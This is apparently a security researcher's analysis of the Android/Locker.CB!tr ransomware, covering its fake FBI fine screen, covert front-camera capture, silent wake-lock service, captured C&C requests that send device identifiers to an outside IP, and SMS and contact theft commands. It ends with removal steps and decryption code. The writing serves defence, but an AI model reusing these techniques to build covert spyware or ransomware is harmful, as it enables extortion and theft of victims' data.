@@ -1,0 +1,56 @@
+There are already a couple of Android ransomware, but Android/Locker.CB!tr certainly is an interesting one.
+The malware claims it has detected "forbidden pornographic" pictures on your device, says it has reported it to the FBI and asks you to pay a fine of $500.
+To make the (fake) report appear even more scary, the malware displays your IP address and a picture of you.
+It says those were sent in the report to the FBI.
+Legend.
+Scare page of Android/Locker
+How did it get the picture of me?
+Quite simply by using your smartphone's front camera!
+Legend.
+Code which selects the front camera to take a snapshot of the victim
+Your phone may well look idle (blank screen and keyboard), but the malware is at work.
+Indeed, the malware uses a WakefulBroadcastReceiver to regularly starts its main service.
+This is specifically implemented to run without lighting up the screen or the keyboard (PARTIAL_WAKE_LOCK).
+Legend.
+Code that will awaken the CheckerService
+This broadcast receiver regularly starts malware's main service, CheckerService.
+The waking up is performed by startWakefulService, which is inherited from the WakefulBroadcastReceiver class, and is implementedto run without lighting the screen or keyboard.
+It is consequently difficult to see something is happening behind your back, the only symptom may be battery drain as the malware actually enquires for new commands every minute:
+GET /pha?android_version=4.4.4&id=b128c8ce66cc32a&phone_number=15555215554&client_version=1.03&imei=000000000000000&name=sdk HTTP/1.1 User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.4; sdk Build/KK) Host: 148.251.154.104:12449 Connection: Keep-Alive Accept-Encoding: gzip ... GET /gac/b128c8ce66cc32a HTTP/1.1 User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.4; sdk Build/KK) Host: 148.251.154.104:12449 Connection: Keep-Alive Accept-Encoding: gzip
+HTTP/1.1 200 OK Date: Tue, 04 Aug 2015 09:45:03 GMT Content-Length: 9 Etag: "59776d31160e106532c76eaade61764c51ce3731" Content-Type: application/json; charset=UTF-8 Server: TornadoServer/4.0.1
+{"id": 3} HTTP requests sent every minute to the C&C, and their response.
+The first request (pha) provides device identification.
+The second request (gac) asks for new commands.
+The final response is an example of the server sending the ACTION_LOCK_PHONE command.
+At first sight, the malware looks like a plain ransomware: locking the device, asking for money, encrypting the SD card.
+It is actually capable of more: it takes its commands from a C&C and locking/unlocking the device, encrypting/decrypting the SD card are mere commands in a broader list:
+Send an SMS message to a specified recipient
+Start or stop to steal incoming SMS messages and forward them to the attacker
+Forward list of contacts to the attacker
+By the way, there is absolutely no indication that the fact of paying will lead to unlocking the phone or decrypting the SD card.
+The attacker remains in control of the phone.
+He/she can choose to ask for another ransom any time...
+This article states that "there is not much users can do if infected with ransomware".
+While this is certainly true for most end-users, there is fortunately a way out for experienced end-users:
+1.
+Unlocking the phone.
+The malicious service that locks the phone is called LockerService.
+Killing it unlocks the phone :) You can do this by connecting a shell to the phone (e.g.
+via adb shell).
+Then issue the command: $ am stopservice com.adobe.videoprayer/.LockerService The action is immediate :)
+2.
+Remove the malware.
+Even once you have unlocked your phone, the malware continues to contact the C&C in background and process commands.
+To completely get rid of the malware, you must uninstall the malicious application.
+In the case we analyzed, do this with: $ pm uninstall com.adobe.videoprayer NB.
+Note it is videopRayer and not videopLayer for the malware ;)
+3.
+Decrypting the SD Card.
+If you were unfortunate enough to receive an "ACTION_CRYPT_DATA" from the C&C, your SD Card's Android directory is encrypted.
+You can decrypt by deriving it:
+public class Decryptor { public static final byte[] SALT = "ThisIsSalt".getBytes(); public static final int ITERATION = 65536; public static final int LENGTH = 256; public static final String PASSWORD = "ThisIsKey";
+public static Key deriveKey(String password, byte [] salt) throws NoSuchAlgorithmException, InvalidKeySpecException { return new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(password.toCharArray(), salt, Decryptor.ITERATION, Decryptor.LENGTH)).getEncoded(), "AES"); }
+and then decrypting recursively each file of the directory with AES: Cipher c = Cipher.getInstance("AES"); c.init(Cipher.DECRYPT_MODE, key); plaintext = c.doFinal(ciphertext);
+NB.
+The malware is detected by FortiGates as Android/Locker.CB!tr, and the C&C's URL is blocked.
+-- the Crypto Girl
